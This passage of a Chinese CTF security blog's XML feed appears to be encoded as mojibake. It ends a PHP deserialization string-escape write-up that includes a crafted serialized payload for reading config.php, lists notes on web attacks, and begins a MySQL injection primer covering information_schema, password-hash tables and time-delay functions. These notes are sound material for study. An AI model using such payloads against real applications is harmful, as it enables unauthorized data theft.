class="hljs-number">4</span>) &#123;<br>  [<span class="hljs-string">&quot;phone&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">11</span>) <span class="hljs-string">&quot;12345678901&quot;</span><br>  [<span class="hljs-string">&quot;email&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">11</span>) <span class="hljs-string">&quot;123@321.com&quot;</span><br>  [<span class="hljs-string">&quot;nickname&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">198</span>) <span class="hljs-string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span><br>  [<span class="hljs-string">&quot;photo&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">10</span>) <span class="hljs-string">&quot;config.php&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯nické‚£ä¹ˆçš„é•¿åº¦è¦å°äº10,é‡‡ç”¨æ•°ç»„ç»•è¿‡</p><p>åœ¨<code>;</code>åé¢åŠ ä¸Š<code>&#125;</code>é—­åˆæ•°ç»„ï¼Œwhereä¹Ÿè¦åŠ ä¸€ä¸ª</p><p>æœ€ç»ˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-string">&#x27;12345678901&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&#x27;123@321.com&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]=<span class="hljs-string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;wokao&#x27;</span>;<br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250205181546710.png" alt="image-20250205181546710"></p><p>ä¸Šä¼ åæ‹¿åˆ°å›¾ç‰‡( è®°å¾—æŠ“åŒ…</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250205181638367.png" alt="image-20250205181638367"></p><p>è§£ç æ‹¿åˆ°flag</p>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å­—ç¬¦ä¸²é€ƒé€¸</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¬”è®°æ¸…å•</title>
    <link href="/2025/02/05/%E7%AC%94%E8%AE%B0%E6%B8%85%E5%8D%95/"/>
    <url>/2025/02/05/%E7%AC%94%E8%AE%B0%E6%B8%85%E5%8D%95/</url>
    
    <content type="html"><![CDATA[<p>éƒ¨åˆ†æœªåŠæ—¶æ›´æ–°</p><ul><li><input disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/01/26/xss%E6%8C%87%E5%8C%97/">xssæŒ‡åŒ—</a></li><li><input disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/01/26/xxe%E6%8C%87%E5%8C%97/">xxeæŒ‡åŒ—</a></li><li><input disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/01/26/Xpath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">Xpathæ³¨å…¥æŒ‡åŒ—</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/01/19/Djingo_ssti/">Djingo_ssti</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/01/26/pker/">pker</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/01/25/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">pickleååºåˆ—åŒ–</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/01/24/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/">PHPåŸç”Ÿç±»ä»‹ç»</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/01/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHPä¼ªåè®®ä»‹ç»</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/01/28/Mysql%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">Mysqlæ³¨å…¥æŒ‡åŒ—</a></li><li><input disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/01/26/MongDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">MongDBæ³¨å…¥æŒ‡åŒ—</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/01/27/%E8%AE%BADNS/">è®ºDNS</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/02/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/">ååºåˆ—åŒ–ä¹‹å­—ç¬¦ä¸²é€ƒé€¸</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/02/15/zip%E6%96%87%E4%BB%B6%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/">zipæ–‡ä»¶é€ƒé€¸æ¼æ´</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/02/15/linux%E6%8F%90%E6%9D%83/">linuxææƒ</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/02/15/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/">phpä¼ªéšæœºæ•°</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>å¯¼èˆª</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mysqlæ³¨å…¥æŒ‡åŒ—</title>
    <link href="/2025/01/28/Mysql%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/"/>
    <url>/2025/01/28/Mysql%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<p>ç¥å¤§å®¶æ–°å¹´å¿«ä¹</p><p>sqlæ³¨å…¥å’Œxsså¹¶ç§°ä¸ºè½é­„çš„æ¼æ´ä¹‹ç‹ï¼Œè™½ç„¶è¢«ç ”ç©¶çš„é€é€çš„äº†ï¼Œä½†æ˜¯ç°åœ¨çš„ctfæ¯”èµ›è¿˜æ˜¯å­˜åœ¨å¾ˆå¤šè¿™æ ·çš„é¢˜ç›®ï¼Œå„ç§å„æ ·çš„ payloadï¼Œä¸ä½†çç¢è€Œä¸”ä¸æˆä½“ç³»,å®é™…ä¸Šå¾ˆå¤šæŠ€å·§éƒ½æ˜¯æ ¹æ®è¯­æ³•æ¥çš„ã€‚å³å¦‚æœçŸ¥é“åŸºæœ¬è¯­æ³•ï¼Œé‚£ä¹ˆå¯¹æ³¨å…¥çš„ payload ä¹Ÿå°±èƒ½äº†ç„¶äºèƒ¸</p><h1 id="Mysqlæ³¨å…¥å­¦ä¹ "><a href="#Mysqlæ³¨å…¥å­¦ä¹ " class="headerlink" title="Mysqlæ³¨å…¥å­¦ä¹ "></a>Mysqlæ³¨å…¥å­¦ä¹ </h1><h2 id="åŸºç¡€è¯­æ³•"><a href="#åŸºç¡€è¯­æ³•" class="headerlink" title="åŸºç¡€è¯­æ³•"></a>åŸºç¡€è¯­æ³•</h2><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20190407031440214.png" alt="20190407031440214"></p><p>é¦–å…ˆï¼Œè¯­æ³•ä¸ºä»ä¸Šåˆ°ä¸‹ã€‚</p><p>ç®€åŒ–ä¹‹å‰çš„å¯¼å›¾ä¸º MySQL æ‰€æœ‰çš„è¯­æ³•ã€‚å…¶å®åœ¨æ³¨å…¥çš„è¿‡ç¨‹ä¸­ç”¨ä¸ç€è¿™ä¹ˆè¯¦ç»†ï¼Œçœ‹çœ‹å°±å¥½ï¼Œæœ‰éœ€è¦å†æŸ¥ä¹Ÿä¸è¿Ÿã€‚ç®€åŒ–çš„ç‰ˆæœ¬åˆ™ä¸º MySQL æ³¨å…¥ä¸­å¸¸è§çš„è¯­æ³•ã€‚</p><p>é¢œè‰²è¡¨ç¤ºï¼šçº¢è‰²ä»£è¡¨ä¸€å®šä¸èƒ½çœç•¥ï¼Œæ©™è‰²ä»£è¡¨éƒ¨åˆ†æƒ…å†µä¸‹èƒ½çœç•¥ï¼Œç°è‰²ä»£è¡¨æ€»æ˜¯å¯ä»¥çœç•¥ã€‚çº¢è‰²ä¸ç°è‰²å¥½æ‡‚ï¼Œæ©™è‰²æ˜¯ä¸ªå•¥å‘¢ï¼Ÿæ‹¿ <code>GROUP BY</code> ä¸ºä¾‹ï¼Œæ„æ€æŒ‡çš„æ˜¯ï¼Œå‡å¦‚æˆ‘ä»¬é€‰äº† <code>GROUP BY</code>ï¼Œé‚£ä¹ˆä¸€å®šè¦å¯¹ <code>col_name</code>ã€<code>expr</code>ã€<code>position</code> è¿›è¡Œä¸‰é€‰ä¸€ã€‚æ ¹æ®ä»ä¸Šåˆ°ä¸‹çš„é¡ºåºï¼Œæ¥ä¸‹æ¥æ˜¯ <code>ASC</code>ã€<code>DESC</code> äºŒé€‰ä¸€ï¼Œå¯é€‰å¯ä¸é€‰ã€‚å¦‚æœæˆ‘ä»¬æ²¡ä½¿ç”¨ <code>GROUP BY</code>ï¼Œé‚£ä¹ˆå°±ä¸éœ€è¦è¿›è¡Œä¸‰é€‰ä¸€ï¼Œå› ä¸ºæµç¨‹æ²¡åˆ°è¿™é‡Œã€‚æ€»ç»“èµ·æ¥å°±æ˜¯ï¼Œå¦‚æœä¸‹ä¸€æ­¥ä¸­å­˜åœ¨æ©™è‰²çš„è¯­æ³•ï¼Œå°±ä¸€å®šè¦ç”¨åˆ°ã€‚</p><h3 id="ç»†èŠ‚"><a href="#ç»†èŠ‚" class="headerlink" title="ç»†èŠ‚"></a>ç»†èŠ‚</h3><ol><li>group byï¼šselect + group by çš„æ—¶å€™ï¼Œæ˜¯å…ˆ group byï¼Œå†ä» group by é‡Œ selectã€‚æ‰€ä»¥ select çš„åˆ—ä¸€å®šè¦åœ¨ group by é‡Œå­˜åœ¨ã€‚</li><li>è¯­å¥æ‰§è¡ŒæˆåŠŸè¿”å›å€¼æœ‰2ç§æƒ…å†µï¼Œç¬¬ä¸€ç§æœ¬èº«è¿”å›æ•°å­—çš„ï¼Œå°±ä¸ºæ•°å­—ï¼Œå³ï¼š<code>select (select database());</code> çš„è¿”å›å€¼ä¸º 1ï¼›å¦åˆ™ï¼Œæ‰§è¡ŒæˆåŠŸä¸º 0ï¼Œåä¹‹ä¸º 1ã€‚å³ï¼š<code>select (select database());</code> çš„è¿”å›å€¼ä¸º 0</li></ol><h2 id="æ•°æ®åº“"><a href="#æ•°æ®åº“" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h2><p>ç³»ç»Ÿè‡ªå¸¦çš„æ•°æ®åº“å¾€å¾€æ˜¯å¾ˆæœ‰ç”¨çš„ï¼Œæ•°æ®ä¸ä»…å…¨é¢ï¼Œè€Œä¸”æƒé™é«˜çš„å¾ˆã€‚</p><h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h3><p><code>information_schema</code> æä¾›äº†è®¿é—®æ•°æ®åº“å…ƒæ•°æ®çš„æ–¹å¼ã€‚ä»€ä¹ˆæ˜¯<code>å…ƒæ•°æ®</code>å‘¢ï¼Ÿå°±æ˜¯å…³äºæ•°æ®çš„æ•°æ®ï¼Œå¦‚æ•°æ®åº“åæˆ–è¡¨åï¼Œåˆ—çš„æ•°æ®ç±»å‹ï¼Œæˆ–è®¿é—®æƒé™ç­‰ã€‚</p><p>æœ‰ç”¨çš„è¡¨å¦‚ä¸‹ï¼š</p><ul><li>schemataï¼šæä¾›äº†å½“å‰ mysql å®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“çš„ä¿¡æ¯ã€‚â€™show databases;<code>çš„ç»“æœå°±æ˜¯ä»è¿™ä¸ªè¡¨çš„</code>SCHEMA_NAME&#96; å­—æ®µæ¥çš„ã€‚</li><li>tablesï¼šè¯¦ç»†è®°è½½äº†æ‰€æœ‰çš„è¡¨çš„åå­—ï¼Œä»¥åŠå“ªä¸ªè¡¨å±äºå“ªä¸ª schemaã€è¡¨çš„ç±»å‹ã€è¡¨çš„å¼•æ“ã€åˆ›å»ºæ—¶é—´ç­‰ç­‰ä¿¡æ¯ã€‚<code>show tables</code> çš„ç»“æœå°±æ˜¯ä»è¿™ä¸ªè¡¨çš„ <code>TABLE_NAME</code> å­—æ®µæ¥çš„ã€‚</li></ul><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p><code>mysql</code> æ•°æ®åº“æ˜¯ mysql çš„æ ¸å¿ƒæ•°æ®åº“ï¼Œï¼Œä¸»è¦è´Ÿè´£å­˜å‚¨æ•°æ®åº“çš„ç”¨æˆ·ã€æƒé™è®¾ç½®ã€å…³é”®å­—ç­‰ mysql è‡ªå·±éœ€è¦ä½¿ç”¨çš„æ§åˆ¶å’Œç®¡ç†ä¿¡æ¯ã€‚</p><p>æœ‰ç”¨çš„è¡¨å¦‚ä¸‹ï¼š</p><ul><li>userï¼š<code>user</code> è¡¨ä¸­è®°å½•äº†ç”¨æˆ·ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·å¯ç™»é™†çš„ ipï¼ˆhost å­—æ®µï¼‰ã€ç”¨æˆ·åï¼ˆUser å­—æ®µï¼‰ã€å¯†ç  hashï¼ˆauthentication_string å­—æ®µï¼‰ã€æ˜¯å¦æœ‰è¯»å–æ–‡ä»¶çš„æƒé™ï¼ˆfile_priv å­—æ®µï¼‰ç­‰ç­‰ã€‚æ³¨æ„ï¼Œå¯¹äº mysql <code>5.7</code> ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œå¯†ç çš„ hash å­—æ®µä¸å†æ˜¯ <code>Password</code>ï¼Œè€Œæ˜¯ <code>authentication_string</code>ã€‚</li></ul><h2 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h2><p>MySQL è‡ªå¸¦çš„å˜é‡çš„ç‰¹å¾å°±æ˜¯å¼€å¤´ <code>@@</code></p><ol><li><code>@@basedir</code>ï¼šMySQL çš„å®‰è£…è·¯å¾„</li><li><code>@@datadir</code>ï¼š MySQL çš„æ•°æ®åº“æ–‡ä»¶ï¼Œå³æ•°æ®æ–‡ä»¶è·¯å¾„</li><li><code>@@version_compile_os</code>ï¼šæ“ä½œç³»ç»Ÿ</li><li><code>@@version</code>ï¼šæ•°æ®åº“ç‰ˆæœ¬</li></ol><h2 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h2><p>è¿™äº›å‡½æ•°åœ¨æ³¨å…¥çš„è¿‡ç¨‹ä¸­èƒ½å¸®åŠ©æˆ‘ä»¬ä¸å°‘å¿™ã€‚å‚æ•°é€šå¸¸å¯ä»¥ä¸º sql è¯­å¥ï¼ˆè¦åŠ æ‹¬å·ï¼‰</p><h3 id="ç‰¹æ®Šå‡½æ•°"><a href="#ç‰¹æ®Šå‡½æ•°" class="headerlink" title="ç‰¹æ®Šå‡½æ•°"></a>ç‰¹æ®Šå‡½æ•°</h3><ul><li><code>user()</code>ï¼šå½“å‰è¿æ¥çš„æ•°æ®åº“ç”¨æˆ·</li><li><code>version()</code>ï¼šæ•°æ®åº“ç‰ˆæœ¬</li></ul><h3 id="å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°"><a href="#å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°" class="headerlink" title="å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°"></a>å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°</h3><ul><li><p>midï¼š</p><ul><li><p>æˆªå–å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mid(string, start[, length])<br></code></pre></td></tr></table></figure><ul><li>stringï¼šå­—ç¬¦ä¸²ï¼Œ</li><li>startï¼šèµ·å§‹ä½ç½®ï¼Œèµ·å§‹ä½ç½®ä¸º 1</li><li>lengthï¼šæˆªå–é•¿åº¦</li></ul></li></ul></li><li><p>substrï¼š</p><ul><li><p>æˆªå–å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">substr(string, start, length)<br></code></pre></td></tr></table></figure><ul><li>stringï¼šå­—ç¬¦ä¸²</li><li>startï¼šèµ·å§‹ä½ç½®ï¼Œèµ·å§‹ä½ç½®ä¸º 1</li><li>lengthï¼šæˆªå–é•¿åº¦</li></ul></li></ul></li><li><p>substringï¼šåŒ <code>substr</code></p></li></ul><p><strong>ä»¥ä¸Šå‡½æ•°çš„å‚æ•°å‡å¯ä»¥ç”¨ <code>from start for end</code> ä»£æ›¿</strong>ï¼Œå¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select substring(&#x27;fuck&#x27; from 2 for 2);#ä»ç¬¬äºŒä¸ªå­—ç¬¦å¼€å§‹æˆªå–é•¿åº¦æ˜¯2<br>+--------------------------------+<br>| substring(&#x27;fuck&#x27; from 2 for 2) |<br>+--------------------------------+<br>| uc                             |<br>+--------------------------------+<br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure><ul><li><p>hexï¼šå°†æ•°å­—&#x2F;å­—ç¬¦ä¸²è½¬ä¸º<code>åå…­è¿›åˆ¶</code>ã€‚ç‰¹åˆ«æ˜¯å­—ç¬¦ä¸²ï¼Œé˜²æ­¢æœ‰ç‰¹æ®Šå­—ç¬¦å¯¼è‡´å‡ºç°å„ç§å¥‡æ€ªçš„é—®é¢˜ã€‚</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">hex(char)<br></code></pre></td></tr></table></figure></li><li><p>unhexï¼šå°†åå…­è¿›åˆ¶è½¬ä¸ºå­—ç¬¦ä¸²ã€‚æ³¨æ„ï¼Œç»“æœä¼šç›´æ¥è½¬ä¸ºå¯¹åº”çš„ acii ç ï¼Œä¾‹å¦‚ <code>unhex(6D7973716C)</code> çš„ç»“æœæ˜¯ <code>mysql</code> è€Œä¸æ˜¯ <code>470189044076</code></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">unhex(data)<br></code></pre></td></tr></table></figure></li><li><p>lengthï¼š</p><ul><li><p>è¿”å›å­—ç¬¦ä¸²é•¿åº¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">length(string)<br></code></pre></td></tr></table></figure><ul><li>stringï¼šå­—ç¬¦ä¸²</li></ul></li></ul></li><li><p>leftï¼š</p><ul><li><p>è·å–å­—ç¬¦ä¸²å·¦è¾¹æ•°èµ·æŒ‡å®šä¸ªæ•°çš„å­—ç¬¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">left(string, n)<br></code></pre></td></tr></table></figure><ul><li>stringï¼šè¦æˆªå–çš„å­—ç¬¦ä¸²</li><li>nï¼šé•¿åº¦</li></ul></li></ul></li><li><p>ordï¼š</p><ul><li><p>è·å–å­—ç¬¦çš„ ASCII ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ord(char)<br></code></pre></td></tr></table></figure><ul><li>charï¼šå­—ç¬¦&#x2F;å­—ç¬¦ä¸²ï¼ˆå¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™å–å®ƒçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼‰</li></ul></li></ul></li><li><p>asciiï¼šåŒ <code>ord</code></p></li><li><p>charï¼š</p><ul><li><p>å°† ASCII ç è½¬ä¸ºå­—ç¬¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">char(a[, ...])<br></code></pre></td></tr></table></figure><ul><li>aï¼šæ•°å­—ï¼›åé¢å¯ä»¥åŠ å¤šä¸ª ASCII ç ï¼Œå³æ„æˆå­—ç¬¦ä¸²ã€‚</li></ul></li></ul></li><li><p>regexpï¼š</p><ul><li><p>æ­£åˆ™åŒ¹é…ï¼ŒåŒ¹é…åˆ°è¿”å› 1ï¼Œåä¹‹ä¸º 0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">string1 regexp string2<br></code></pre></td></tr></table></figure><ul><li>string1ï¼šåŒ¹é…çš„å­—ç¬¦ä¸²</li><li>string2ï¼šæ­£åˆ™è¡¨è¾¾å¼</li></ul></li></ul></li><li><p>concatï¼š</p><ul><li><p>è¿æ¥ï¼ˆå¤šä¸ªï¼‰å­—ç¬¦ä¸²ï¼ˆæ•°å­—ï¼‰ï¼Œè¿”å›å­—ç¬¦ä¸²ã€‚å¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªå‚æ•°ä¸º nullï¼Œåˆ™è¿”å›å€¼ä¸º null</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">concat(string[, ...])<br></code></pre></td></tr></table></figure><ul><li>stringï¼šä»»æ„å€¼</li></ul></li></ul></li><li><p>concat_ws</p><ul><li><p>å’Œ concat ç±»ä¼¼ï¼Œå°†å¤šä¸ªå­—ç¬¦ä¸²è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä½†æ˜¯å¯ä»¥æŒ‡å®šè¿æ¥ç¬¦ã€‚å¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªå‚æ•°ä¸º nullï¼Œå¯¹è¿”å›å€¼æ— å½±å“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">concat_ws(sep, string[, ...])<br></code></pre></td></tr></table></figure><ul><li>sepï¼šè¿æ¥ç¬¦</li><li>stringï¼šä»»æ„å€¼</li></ul></li></ul></li><li><p>group_concat</p><ul><li><p>å°† group by äº§ç”Ÿçš„åŒä¸€ä¸ªåˆ†ç»„ä¸­çš„å€¼è¿æ¥èµ·æ¥ï¼Œæˆä¸ºä¸€ä¸ªå­—ç¬¦ä¸²å¹¶è¿”å›</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">group_concat([distinct] colname [order by colname asc/desc ][separator sep])<br></code></pre></td></tr></table></figure><ul><li>distinctï¼šå»é‡</li><li>colnameï¼šåˆ—å</li><li>sepï¼šåˆ†éš”ç¬¦</li></ul></li></ul></li></ul><h3 id="å»¶æ—¶å‡½æ•°"><a href="#å»¶æ—¶å‡½æ•°" class="headerlink" title="å»¶æ—¶å‡½æ•°"></a>å»¶æ—¶å‡½æ•°</h3><ul><li><p>sleepï¼š</p><ul><li><p>å»¶è¿Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">sleep(sec)<br></code></pre></td></tr></table></figure><ul><li>secï¼šç§’</li></ul></li></ul></li><li><p>banchmarkï¼š</p><ul><li><p>é‡å¤æ‰§è¡Œå‡½æ•°ï¼Œè¾ƒå ç”¨ cpu</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">banchmark(count, func)<br></code></pre></td></tr></table></figure><ul><li>countï¼šæ‰§è¡Œçš„æ¬¡æ•°</li><li>funcï¼šå‡½æ•°</li></ul></li></ul></li><li><p><strong>ç¬›å¡å°”ç§¯</strong></p><p> ç¬›å¡å°”ç§¯(å› ä¸ºè¿æ¥è¡¨æ˜¯ä¸€ä¸ªå¾ˆè€—æ—¶çš„æ“ä½œ)</p><p> AxB&#x3D;Aå’ŒBä¸­æ¯ä¸ªå…ƒç´ çš„ç»„åˆæ‰€ç»„æˆçš„é›†åˆï¼Œå°±æ˜¯è¿æ¥è¡¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT count(*) FROM information_schema.columns A, <br>information_schema.columns B, information_schema.tables C;<br>select * from table_name A, table_name B<br>select * from table_name A, table_name Bï¼Œtable_name C<br>select count(*) from table_name A, table_name Bï¼Œtable_name C <br></code></pre></td></tr></table></figure><p> è¡¨å¯ä»¥æ˜¯åŒä¸€å¼ è¡¨,å—æœåŠ¡å™¨æ€§èƒ½å½±å“å¾ˆå¤§</p></li></ul><p>å¦å¤–ï¼Œåˆ©ç”¨ <code>å¸¦å¤–é€šé“</code> å‘èµ·ç½‘ç»œè¯·æ±‚ï¼Œä¹Ÿæœ‰å¯èƒ½é€ æˆæ—¶å»¶ã€‚ä¸è¿‡ MySQL çš„å¸¦å¤–é€šé“åªèƒ½åœ¨ Windows ä¸‹åˆ©ç”¨ <code>LOAD_FILE</code> å®Œæˆã€‚</p><h3 id="æ•°å­¦å‡½æ•°"><a href="#æ•°å­¦å‡½æ•°" class="headerlink" title="æ•°å­¦å‡½æ•°"></a>æ•°å­¦å‡½æ•°</h3><ul><li><p><strong>ABS(x)</strong></p><ul><li>è¿”å› <code>x</code> çš„ç»å¯¹å€¼ã€‚</li><li>ç¤ºä¾‹ï¼š<code>select abs(-5);</code> â†’ ç»“æœ <code>5</code></li></ul></li><li><p><strong>CEIL(x)</strong> æˆ– <strong>CEILING(x)</strong></p><ul><li>è¿”å›ä¸å°äº <code>x</code> çš„æœ€å°æ•´æ•°ï¼ˆå‘ä¸Šå–æ•´ï¼‰ã€‚</li><li>ç¤ºä¾‹ï¼š<code>select ceil(3.2);</code> â†’ ç»“æœ <code>4</code></li></ul></li><li><p><strong>FLOOR(x)</strong></p><ul><li>è¿”å›ä¸å¤§äº <code>x</code> çš„æœ€å¤§æ•´æ•°ï¼ˆå‘ä¸‹å–æ•´ï¼‰ã€‚</li><li>ç¤ºä¾‹ï¼š<code>select floor(3.8);</code> â†’ ç»“æœ <code>3</code></li></ul></li><li><p><strong>ROUND(x, d)</strong></p><ul><li>å°† <code>x</code> å››èˆäº”å…¥åˆ° <code>d</code> ä½å°æ•°ï¼ˆé»˜è®¤ä¸º <code>d=0</code>ï¼‰ã€‚</li><li>ç¤ºä¾‹ï¼š<code>select round(3.1415, 2);</code> â†’ ç»“æœ <code>3.14</code></li></ul></li><li><p><strong>RAND()</strong></p><ul><li><p>ç”Ÿæˆ 0 åˆ° 1 ä¹‹é—´çš„éšæœºæµ®ç‚¹æ•°ã€‚</p></li><li><p>ç¤ºä¾‹ï¼š<code>select rand();</code> â†’ ç»“æœç±»ä¼¼ <code>0.5487</code></p></li><li><p>ç”ŸæˆèŒƒå›´éšæœºæ•´æ•°ï¼ˆå¦‚ 1-100ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select floor(rand() * 100) + 1;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>POW(x, y)</strong> æˆ– <strong>POWER(x, y)</strong></p><ul><li>è¿”å› <code>x</code> çš„ <code>y</code> æ¬¡æ–¹ã€‚</li><li>ç¤ºä¾‹ï¼š<code>select pow(2, 3);</code> â†’ ç»“æœ <code>8</code></li></ul></li><li><p><strong>SQRT(x)</strong></p><ul><li>è¿”å› <code>x</code> çš„å¹³æ–¹æ ¹ï¼ˆè‹¥ <code>x</code> ä¸ºè´Ÿæ•°ï¼Œè¿”å› <code>NULL</code>ï¼‰ã€‚</li><li>ç¤ºä¾‹ï¼š<code>select sqrt(16);</code> â†’ ç»“æœ <code>4</code></li></ul></li></ul><h3 id="èšåˆå‡½æ•°"><a href="#èšåˆå‡½æ•°" class="headerlink" 